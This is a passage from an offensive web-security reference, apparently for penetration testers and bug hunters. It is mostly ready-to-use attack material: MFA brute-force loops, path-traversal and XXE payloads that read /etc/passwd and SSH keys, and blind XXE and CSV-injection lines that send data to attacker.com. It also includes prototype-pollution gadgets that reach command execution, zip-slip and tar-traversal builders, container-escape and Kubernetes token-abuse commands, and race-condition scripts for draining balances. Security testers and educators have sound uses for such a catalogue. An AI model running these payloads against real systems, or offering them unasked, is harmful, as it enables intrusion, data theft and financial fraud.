header = {
    "alg": "RS256",
    "jwk": jwk  # Inject our own public key!
}

token = jwt.encode({"user": "admin"}, private_key, algorithm="RS256", headers=header)
# Server may verify using the injected JWK instead of its own key
```

### 5.3 Session Fixation & Hijacking

```bash
# === Session Fixation ===
# Step 1: Obtain session ID before login
GET /login
# Response: Set-Cookie: sessionid=FIXED_ID

# Step 2: Force victim to use this session ID
# (via XSS, CSRF, or social engineering)

# Step 3: Victim logs in
# Session FIXED_ID is now authenticated

# Step 4: Attacker uses FIXED_ID to access victim's account

# === Session Prediction ===
# If session IDs are predictable:
# sessionid = md5(timestamp) → can be predicted
# sessionid = user_id + secret → can be forged

# Test for predictability:
# 1. Request multiple session IDs
# 2. Check for patterns (sequential, timestamps, hashes)
# 3. Try to predict next session ID
```

### 5.4 MFA Bypass Techniques

```bash
# === Bypass 1: Brute force OTP ===
# If no rate limiting on OTP verification:
for i in {0000..9999}; do
  curl -X POST "https://target.com/verify-otp" -d "otp=$i"
done

# === Bypass 2: Response manipulation ===
# If MFA status is client-controlled:
POST /api/login
{"username": "admin", "password": "password", "mfa_verified": true}

# === Bypass 3: Direct endpoint access ===
# Skip MFA by accessing protected endpoint directly
GET /api/admin/dashboard
# Instead of completing MFA flow

# === Bypass 4: Session state manipulation ===
# If MFA state is in session, not server-side:
# Modify session cookie to indicate MFA passed

# === Bypass 5: Backup code abuse ===
# If backup codes have no rate limiting
# If backup codes are not invalidated after use

# === Bypass 6: OAuth bypass ===
# Login via OAuth (may skip MFA)
# Then access MFA-protected resources

# === Bypass 7: API key bypass ===
# Use API key instead of session
# API keys may not require MFA
```

---

## 6. Authorization & Access Control

### 6.1 IDOR Patterns

#### Direct Reference

```bash
# === Numeric ID ===
# Attacker's data: /api/user/123
# Victim's data:  /api/user/124

# Test:
curl "https://target.com/api/user/124" -H "Authorization: Bearer ATTACKER_TOKEN"
# Expected: 403 Forbidden
# Bug:      200 OK with victim's data

# === UUID-based ===
# If UUIDs are exposed in other contexts (public profiles, API responses)
# Collect UUIDs and test access

# === Predictable patterns ===
/api/document/DOC-2024-0001
/api/document/DOC-2024-0002  # Increment

# === Parameter pollution ===
GET /api/user?id=123&id=124  # Which one is used?
GET /api/user?id[]=123&id[]=124  # Array handling
```

#### Indirect Reference

```bash
# === Hashed/encoded references ===
# ID is encoded: /api/user/aWQ9MTIz (base64 of "id=123")
# Decode: echo "aWQ9MTIz" | base64 -d → "id=123"

# Test: encode different IDs
echo -n "id=124" | base64 → "aWQ9MTI0"
curl "https://target.com/api/user/aWQ9MTI0"

# === Hashed references ===
# ID is MD5: /api/user/202cb962ac59075b964b07152d234b70 (MD5 of "123")
# Test: echo -n "124" | md5sum → new hash

# === HMAC references ===
# ID + signature: /api/user/123:abc123def (HMAC of "123")
# If HMAC secret is known or weak, forge signatures
```

### 6.2 Path Traversal

```bash
# === Basic traversal ===
../../../etc/passwd
..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..\../..\../..\../etc/passwd
%252e%252e%252fetc%252fpasswd (double-encoded)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd (UTF-8 overlong)
.../.../.../etc/passwd
..../..../..../etc/passwd

# === With null byte (PHP < 5.3.4) ===
../../../etc/passwd%00.jpg

# === In URL parameters ===
?file=../../../etc/passwd
?download=../../../etc/passwd
?path=../../../etc/passwd
?template=../../../etc/passwd

# === In filename parameters ===
POST /upload
filename="../../../var/www/html/shell.php"

# === Wrappers ===
php://filter/read=convert.base64-encode/resource=../../../etc/passwd
php://input (POST data as file)
data://text/plain,<?php phpinfo(); ?>
expect://whoami
file:///etc/passwd
```

### 6.3 Mass Assignment

```bash
# === Parameter discovery ===
# Look for _id, _type, is_, has_ patterns

# === Role escalation ===
POST /api/register
Content-Type: application/json

{
  "username": "attacker",
  "password": "password",
  "role": "admin",
  "is_admin": true,
  "is_staff": true,
  "is_superuser": true
}

# === Credit/tier manipulation ===
POST /api/subscribe
{
  "plan": "premium",
  "price": 0,
  "credits": 999999,
  "tier": "enterprise"
}

# === Internal field manipulation ===
POST /api/user/update
{
  "username": "attacker",
  "balance": 999999,
  "verified": true,
  "internal_notes": "Trusted user"
}
```

### 6.4 HTTP Parameter Pollution (HPP)

```bash
# === Server-side HPP ===
# When backend concatenates duplicate parameters

# Node.js/Express: uses last value
GET /api/search?user=admin&user=attacker → uses "attacker"

# PHP: uses last value (by default)
GET /api/search?user=admin&user=attacker → uses "attacker"

# ASP.NET: joins with comma
GET /api/search?user=admin&user=attacker → "admin,attacker"

# Python/Django: uses last value
GET /api/search?user=admin&user=attacker → uses "attacker"

# Java/Spring: uses first or array
GET /api/search?user=admin&user=attacker → ["admin", "attacker"]

# === HPP for bypass ===
# Bypass validation by providing both good and bad values
GET /api/transfer?amount=100&amount=9999
# Validation checks first value (100), processing uses second (9999)

# HPP for cache poisoning
GET /api/page?format=json&format=html
# Cache may store one variant, serve to wrong clients
```

---

## 7. Prototype Pollution

### 7.1 Detection by Language

#### Node.js Detection

```javascript
// === Detection payload ===
// Any endpoint that accepts JSON and merges recursively

// Test 1: Check if __proto__ is accessible
POST /api/preferences
Content-Type: application/json

{"__proto__": {"isAdmin": true}}

// Verify: check if isAdmin appears on all objects
GET /api/check
// Response should show isAdmin: true if polluted

// Test 2: Polluted property reflection
POST /api/settings
{"__proto__": {"toString": "polluted", "valueOf": "polluted"}}

// Test 3: Constructor pollution
{"__proto__": {"constructor": {"prototype": {"isAdmin": true}}}}

// Test 4: Using JSON.parse with reviver
// Some libraries use JSON.parse(input, reviver) which may be vulnerable

// Common vulnerable patterns:
// - lodash.merge(), lodash.defaultsDeep()
// - jQuery.extend(true, target, source)
// - merge-deep, deep-extend, deepmerge packages
// - Object.assign() with nested objects
// - Custom recursive merge functions
```

#### Python Detection

```python
# === Class pollution in Python ===
# Python's __class__ and __base__ can be polluted

# Payload via JSON:
{"__class__": {"__base__": {"__subclasses__": []}}}

# Or via pickle (if user-controlled):
# Never unpickle user-controlled data

# Common Python patterns:
# - dict.update() with user input
# - Custom __init__ with setattr loops
# - Merging configuration objects
```

#### Ruby Detection

```ruby
# === Ruby class pollution ===
# Via JSON parsing with symbolize_names

# Payload:
{"json_class": "Object", " polluted ": true}

# Or via Hash#merge with user input:
params.merge!(user_input)  # If user_input contains class modification
```

### 7.2 Gadget Chain Construction

#### Node.js Common Gadgets

```javascript
// === Gadget 1: Child Process RCE ===
// Pollute shell option for child_process
POST /api/preferences
{
  "__proto__": {
    "shell": "/bin/bash",
    "NODE_OPTIONS": "--require /proc/self/environ"
  }
}

// === Gadget 2: EJS Template Engine ===
// Pollute outputFunctionName to inject code
{
  "__proto__": {
    "outputFunctionName": "a; return global.process.mainModule.require('child_process').execSync('whoami'); //"
  }
}

// === Gadget 3: Handlebars ===
// Via prototype pollution of compiler options
{
  "__proto__": {
    "compilerOptions": {
      "compat": true,
      "knownHelpers": {
        "exec": true
      }
    }
  }
}

// === Gadget 4: Express.js ===
// Pollute options for view rendering
{
  "__proto__": {
    "settings": {
      "view options": {
        "layout": false,
        "engine": "ejs"
      }
    }
  }
}

// === Gadget 5: lodash.defaultsDeep ===
// RCE via pollution of template sources
{
  "__proto__": {
    "template": {
      "source": "<%= global.process.mainModule.require('child_process').execSync('whoami') %>"
    }
  }
}
```

### 7.3 Client-Side Prototype Pollution to XSS

```javascript
// === DOM Clobbering to Prototype Pollution ===
// 1. Find a vulnerable merge function in client JS
// 2. Pollute via URL parameters

// URL:
https://target.com/page?__proto__[isAdmin]=true

// Vulnerable code:
const params = new URLSearchParams(location.search);
const settings = {};
for (const [key, value] of params) {
  // Vulnerable: directly assigns to nested property
  _.set(settings, key, value);
}

// Result: Object.prototype.isAdmin = "true"

// === Pollution to bypass DOMPurify ===
// 1. Pollute ALLOWED_ATTR
location.search = "?__proto__[ALLOWED_ATTR]=[onerror,src]"

// 2. Submit XSS payload
// DOMPurify now allows onerror attribute
// <img src=x onerror=alert(1)>

// === CVE-2026-41238-style DOMPurify bypass ===
// Via prototype pollution of DOMPurify config:
// 1. Pollute: config.ALLOWED_ATTR to include event handlers
// 2. Pollute: config.ALLOW_DATA_ATTR to true
// 3. Standard payloads now pass sanitization
```

---

## 8. XML & File Parsing

### 8.1 XXE (XML External Entity) Attacks

#### Basic XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- Result: /etc/passwd contents in XML response -->
```

#### Blind XXE

```xml
<!-- Out-of-band data extraction -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<foo>&send;</foo>

<!-- evil.dtd hosted on attacker.com -->
<!ENTITY send SYSTEM "http://attacker.com/?c=%xxe;">
```

#### Error-Based XXE

```xml
<!-- Force error message to contain file contents -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>
<bar>
<!-- Use xxe where only number expected -->
<value>&xxe;</value>
</bar>
</foo>

<!-- Error: "foobar: /etc/passwd contents: value must be numeric" -->
```

#### XXE via Parameter Entities

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo></foo>
```

#### XXE File Targets

```xml
<!-- Linux -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
<!ENTITY xxe SYSTEM "file:///proc/self/cwd/config.php">
<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///tmp/sess_[session_id]">

<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">

<!-- PHP wrappers -->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">
```

### 8.2 Billion Laughs (XML Entity Expansion)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

<!-- 10^9 "lol" strings = ~3GB memory expansion -->
```

### 8.3 CSV Injection

```csv
# Malicious CSV payload
Username,Role,Admin
=cmd|'/C calc'!A0,User,FALSE
=@SUM(1+1)*cmd|' /C calc'!A0,User,FALSE
=HYPERLINK("http://attacker.com/malware.exe","Click here"),User,FALSE

# When opened in Excel, triggers:
# - Command execution via DDE
# - Hyperlink to malware
# - Formula evaluation

# Google Sheets equivalent:
=IMPORTXML("http://attacker.com/?c="&A1,"//a")
=WEBSERVICE("http://attacker.com/?c="&A1)
```

### 8.4 PDF Injection

```pdf
# PDF form injection
# If user input appears in generated PDF:

# JavaScript in PDF:
<</Type/Action/S/JavaScript/JS(app.launchURL("http://attacker.com/", true))>>

# PDF XSS via annotations:
<</Type/Annot/Subtype/Link/A<</S/URI/URI(javascript:alert(1))>>>

# URI action injection:
<</Type/Action/S/URI/URI(file:///etc/passwd)>>
```

### 8.5 Archive-Based Attacks

#### Zip Slip

```python
# zip-slip.py - Create malicious archive
import zipfile
import os

with zipfile.ZipFile('malicious.zip', 'w') as z:
    # Traversal in filename
    z.writestr('../../../tmp/malicious.sh', '#!/bin/bash\nid\n')
    z.writestr('..\\..\\..\\windows\\system32\\malicious.bat', 'whoami\n')

# The ../ in archive entry names bypasses extraction path validation
# Files are written outside intended directory
```

#### Tar Traversal

```python
import tarfile

with tarfile.open('malicious.tar', 'w') as t:
    # Add file with traversal path
    data = b'#!/bin/bash\nmalicious payload\n'
    info = tarfile.TarInfo(name='../../../etc/cron.d/malicious')
    info.size = len(data)
    t.addfile(info, io.BytesIO(data))
```

---

## 9. Infrastructure & Cloud

### 9.1 Container Escape Patterns

```bash
# === Check if inside container ===
ls -la /.dockerenv 2>/dev/null
# OR check cgroup:
cat /proc/1/cgroup | grep docker

# === Docker socket escape ===
# If /var/run/docker.sock is mounted:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
# List all containers, then create privileged container:
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "chroot /host id"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }' \
  http://localhost/containers/create

# === Privileged container escape ===
# If container runs with --privileged:
# Mount host disk:
fdisk -l  # Find host device (e.g., /dev/sda1)
mkdir /host_mount
mount /dev/sda1 /host_mount
chroot /host_mount

# === Kernel exploit escape ===
# If kernel is outdated on host:
# Use known kernel exploits (dirty cow, privilege escalation CVEs)

# === Writable cgroup escape ===
# If cgroup is writable:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /flag > /dev/console" >> /cmd
chmod a+x /cmd
sh -c "echo \\$$ > /tmp/cgrp/x/cgroup.procs"
```

### 9.2 Kubernetes Misconfigurations

```bash
# === Check for Kubernetes service account token ===
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# === Use token to query Kubernetes API ===
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN"

# === Common misconfigurations ===
# 1. Overly permissive RBAC:
curl -k https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterroles \
  -H "Authorization: Bearer $TOKEN"

# 2. Privileged pods:
curl -k https://kubernetes.default.svc/api/v1/pods \
  -H "Authorization: Bearer $TOKEN" | jq '.items[] | select(.spec.containers[].securityContext.privileged == true)'

# 3. HostPath mounts:
curl -k https://kubernetes.default.svc/api/v1/pods \
  -H "Authorization: Bearer $TOKEN" | jq '.items[] | select(.spec.volumes[].hostPath)'

# 4. Exposed etcd (no auth):
curl http://etcd-server:2379/v2/keys/?recursive=true

# 5. kubelet read-only port (10255):
curl http://node-ip:10255/pods
curl http://node-ip:10255/spec

# 6. kubelet exec API:
curl -k https://node-ip:10250/exec/default/pod-name/container-name?command=whoami
```

### 9.3 S3 Bucket Enumeration & Exploitation

```bash
# === Bucket enumeration ===
# Common naming patterns:
# {company}-assets, {company}-uploads, {company}-backup, {company}-dev
# {app}-production, {app}-staging, {app}-development

# Automated enumeration:
# Using s3scanner:
s3scanner -d company_name -o s3_results.txt

# Using aws CLI (no credentials needed for public buckets):
aws s3 ls s3://company-name-assets/ --no-sign-request
aws s3 ls s3://company-name-backup/ --no-sign-request

# Permission testing:
aws s3api get-bucket-acl --bucket company-name --no-sign-request
aws s3api get-bucket-policy --bucket company-name --no-sign-request

# Common misconfigurations:
# 1. Public read access:
aws s3 cp s3://company-bucket/sensitive-file.txt . --no-sign-request

# 2. Public write access (bucket takeover):
aws s3 cp index.html s3://company-bucket/ --no-sign-request

# 3. List permissions:
aws s3 ls s3://company-bucket/ --no-sign-request

# 4. Policy allows * principal:
# Check bucket policy for "Principal": "*"
```

### 9.4 Lambda/Serverless Injection Points

```bash
# === Event injection ===
# Lambda functions process various event sources:
# - API Gateway (HTTP requests)
# - S3 events (file uploads)
# - SQS/SNS messages
# - DynamoDB streams
# - CloudWatch events

# Common vulnerabilities:
# 1. Deserialization in event data
# 2. Command injection in file processing
# 3. SQL injection in DynamoDB queries
# 4. SSRF from Lambda to internal services
# 5. Path traversal in S3 file handling

# Lambda environment variables:
# Check for hardcoded secrets in:
# - process.env (Node.js)
# - os.environ (Python)
# - Environment.GetEnvironmentVariable (C#)

# Lambda IAM role:
# Check what the Lambda execution role has access to:
# - STS:GetCallerIdentity to get role ARN
# - Then enumerate role permissions
```

---

## 10. Business Logic

### 10.1 Race Condition Exploitation

#### Coupon Multiple Application

```python
import asyncio
import aiohttp

async def race_coupon(session, url, headers):
    """Race condition: apply one-time coupon multiple times"""
    payload = {
        "order_id": "ORDER_12345",
        "coupon_code": "WELCOME50"  # One-time use coupon
    }
    async with session.post(url, json=payload, headers=headers) as resp:
        return await resp.json()

async def main():
    url = "https://target.com/api/apply-coupon"
    headers = {"Authorization": "Bearer USER_TOKEN"}

    async with aiohttp.ClientSession() as session:
        # Send 20 requests simultaneously
        tasks = [race_coupon(session, url, headers) for _ in range(20)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        success_count = sum(1 for r in results
                          if isinstance(r, dict) and r.get('success'))
        print(f"Coupon applied successfully {success_count} times")
        # If > 1, race condition exists

asyncio.run(main())
```

#### Balance Manipulation

```python
import asyncio
import aiohttp

async def withdraw(session, url, headers, amount):
    """Race condition: withdraw more than balance"""
    payload = {"amount": amount, "account_id": "12345"}
    async with session.post(url, json=payload, headers=headers) as resp:
        return await resp.json()

async def main():
    url = "https://target.com/api/withdraw"
    headers = {"Authorization": "Bearer USER_TOKEN"}

    # Balance: $100
    # Try to withdraw $100 twenty times simultaneously
    async with aiohttp.ClientSession() as session:
        tasks = [withdraw(session, url, headers, 100) for _ in range(20)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        total_withdrawn = sum(
            r.get('amount', 0) for r in results
            if isinstance(r, dict) and r.get('success')
        )
        print(f"Total withdrawn: ${total_withdrawn}")
        # If > $100, race condition exists

asyncio.run(main())
```

#### Limit Bypass

```python
# API credit limit bypass via race condition
# Credits remaining: 1
# Try to use 20 API calls simultaneously

async def api_call(session, url, headers):
    async with session.get(url, headers=headers) as resp:
        return resp.status, await resp.text()

async def main():
    url = "https://target.com/api/expensive-operation"
    headers = {"Authorization": "Bearer USER_TOKEN", "X-API-Key": "KEY"}

    async with aiohttp.ClientSession() as session:
        # Send all requests in a burst
        tasks = [api_call(session, url, headers) for _ in range(50)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        success_count = sum(1 for status, _ in results if status == 200)
        rate_limited = sum(1 for status, _ in results if status == 429)
        print(f"Success: {success_count}, Rate limited: {rate_limited}")
        # If success_count > credit_limit, race condition exists

asyncio.run(main())
```

### 10.2 Price Manipulation

```bash
# === Client-side price manipulation ===
# Many applications trust client-sent prices

# In checkout request:
POST /api/checkout
Content-Type: application/json

{
  "items": [
    {"product_id": "123", "quantity": 1, "price": 999.99}
  ],
  "total": 0.01  # Manipulated total
}

# === Negative quantity ===
{
  "items": [
    {"product_id": "123", "quantity": 1, "price": 100},
    {"product_id": "123", "quantity": -1, "price": 100}  # Negative!
  ]
}

# === Decimal quantity ===
{
  "items": [
    {"product_id": "123", "quantity": 0.1, "price": 100}
  ]
}

# === Currency arbitrage ===
# If exchange rates are client-controlled:
{
  "currency": "USD",
  "exchange_rate": 0.001,  # Instead of 1.0
  "amount": 1000
}
```

### 10.3 Workflow Bypass

```bash
# === Step skipping ===
# Multi-step processes with step validation client-side:

# Step 1: /checkout/address
# Step 2: /checkout/payment
# Step 3: /checkout/confirm

# Bypass: Jump directly to step 3
POST /checkout/confirm
{
  "order_id": "12345",
  "payment_method": "COD"  # Skip payment entirely
}

# === Required field bypass ===
POST /api/register
{
  "username": "attacker",
  "password": "password",
  "email": "attacker@example.com",
  "terms_accepted": true,  # Bypass client-side validation
  "age_verified": true
}

# === Verification bypass ===
# Email verification, KYC, etc.
POST /api/verify-email
{
  "user_id": "12345",
  "verified": true  # Client-controlled verification flag
}
```

### 10.4 Feature Abuse

```bash
# === Mass resource creation ===
# If no limits on resource creation:
# Create thousands of projects/teams/accounts
POST /api/projects
{"name": "spam-project-$RANDOM"}
# Impact: Resource exhaustion, storage costs

# === Invitation abuse ===
# Send unlimited invitations:
POST /api/invite
{"email": "victim@company.com"}
# Impact: Email spam, harassment

# === Report generation abuse ===
# Request expensive report generation:
POST /api/reports/generate
{
  "date_range": "2020-01-01 to 2025-12-31",
  "format": "pdf",
  "include_all": true
}
# Impact: DoS via resource exhaustion

# === File upload abuse ===
# Upload many large files:
POST /api/upload
Content-Type: multipart/form-data
# File: /dev/zero (infinite size if not limited)
# Impact: Storage exhaustion

# === Search/indexing abuse ===
# Search with expensive queries:
GET /api/search?q=*:*&facet=true&facet.field=*
# Impact: DoS via expensive search queries
```

---

## Appendix: Quick Reference Decision Tree

```
Endpoint discovered
    |
    +-- Has user-controlled IDs? --> IDOR testing
    |   |
    |   +-- Swap IDs between accounts
    |   +-- Test for indirect references
    |   +-- Test parameter pollution
    |
    +-- Accepts user input? --> XSS testing
    |   |
    |   +-- Test all contexts (HTML, JS, URL, CSS, SVG)
    |   +-- Test with DOMPurify/filter bypasses
    |   +-- Check for prototype pollution chains
    |
    +-- Has URL/URI parameters? --> SSRF testing
    |   |
    |   +-- Test internal addresses
    |   +-- Test cloud metadata endpoints
    |   +-- Test protocol smuggling
    |
    +-- Accepts structured data? --> Injection testing
    |   |
    |   +-- JSON input --> SQLi, NoSQLi, Command injection
    |   +-- XML input --> XXE
    |   +-- File upload --> Path traversal, malicious content
    |
    +-- Has authentication? --> Auth testing
    |   |
    |   +-- Test session management
    |   +-- Test JWT implementation
    |   +-- Test OAuth flows
    |   +-- Test MFA bypass
    |
    +-- Has authorization checks? --> Privilege testing
    |   |
    |   +-- Test role-based access
    |   +-- Test cross-tenant access
    |   +-- Test mass assignment
    |
    +-- Has numeric operations? --> Logic testing
        |
        +-- Test race conditions
        +-- Test price/quantity manipulation
        +-- Test workflow bypass
```

---

*End of Modern Bug Classes Reference*
